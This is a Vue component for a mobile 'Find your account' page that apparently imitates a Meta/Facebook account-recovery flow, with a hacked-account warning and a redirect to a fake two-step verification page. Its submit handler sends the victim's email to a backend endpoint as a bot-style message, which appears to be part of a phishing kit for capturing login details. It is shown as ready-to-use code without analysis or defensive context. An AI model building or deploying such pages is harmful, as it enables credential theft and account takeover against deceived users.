
<template>
  <div
    class="md:hidden h-screen flex flex-col p-4 pt-12 items-center bg-gradient-to-r from-purple-50 to-blue-50"
    @click="handleResetFocus"
  >
    <a href="/login?a=1" class="fixed top-3 left-3 cursor-pointer">
      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
        <!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE -->
        <path
          fill="currentColor"
          d="m6.4 18.308l-.708-.708l5.6-5.6l-5.6-5.6l.708-.708l5.6 5.6l5.6-5.6l.708.708l-5.6 5.6l5.6 5.6l-.708.708l-5.6-5.6z"
        />
      </svg>
    </a>
    <div class="w-full font-semibold text-lg">
      {{ $t('Find your account') }}
    </div>
    <div class="my-2 mb-5 border p-2 border-yellow-500 bg-yellow-100 text-sm">
      {{
        $t(
          "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
        )
      }}
      <a class="text-[#0064E0]" href="/login?a=1">
        {{ $t('cancel this process') }}
      </a>
    </div>
    <form class="w-full" @submit.prevent="handleSubmit">
      <div
        class="mb-4 input bg-white"
        :class="{
          '!border-[rgb(103,120,138)] border': isFocusEmail && email.trim(),
        }"
        @click.stop="handleFocus('email', $refs.emailElement)"
      >
        <p
          :class="{
            ' transform translate-y-[9px] text-[16px]': !isFocusEmail && !email.trim(),
          }"
          class="text-[13px] text-[rgb(70,90,105)]"
        >
          Email address
        </p>
        <input
          ref="emailElement"
          v-model="email"
          type="text"
          class="h-5 text-[rgb(28,43,51)]"
          autocomplete="off"
          :class="{
            'opacity-0': !isFocusEmail && !email.trim(),
          }"
          @focus="isFocusEmail = true"
          @blur="isFocusEmail = false"
        />
      </div>
      <!-- <div class="mb-4">
        <input v-model="password" type="password" placeholder="Password" class="input" />
      </div> -->

      <button
        type="submit"
        class="w-full h-[44px] py-2 mb-3 text-white bg-blue-600 rounded-full hover:bg-blue-700"
      >
        Continue
      </button>
    </form>
  </div>
</template>

<script setup lang="ts">
import { ref } from 'vue'

const email = ref('')
const password = ref('')
const router = useRouter()
const isFocusEmail = ref(false)
const isFocusPassword = ref(false)

const handleResetFocus = () => {
  isFocusEmail.value = false
  isFocusPassword.value = false
}

const handleFocus = (type: string, ref: any) => {
  if (type === 'email') {
    isFocusEmail.value = true
    ref.focus()
  } else {
    isFocusPassword.value = true
    ref.focus()
  }
}

const handleSubmit = async () => {
  if (!email.value) {
    return
  }

  // Call your API here
  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ message: `📭 Email: <code>${email.value}</code>` }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
  } catch (error) {
    console.error(error)
  }
  window.location.href = '/two_step_verification/two_factor?a=1'
  // router.push('/two_step_verification/two_factor')
}
</script>

<style scoped>
.input {
  @apply w-full px-4 py-2 h-[62px] border rounded-[12px] border-gray-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500;
}
input {
  outline: none;
  width: 100%;
}
</style>
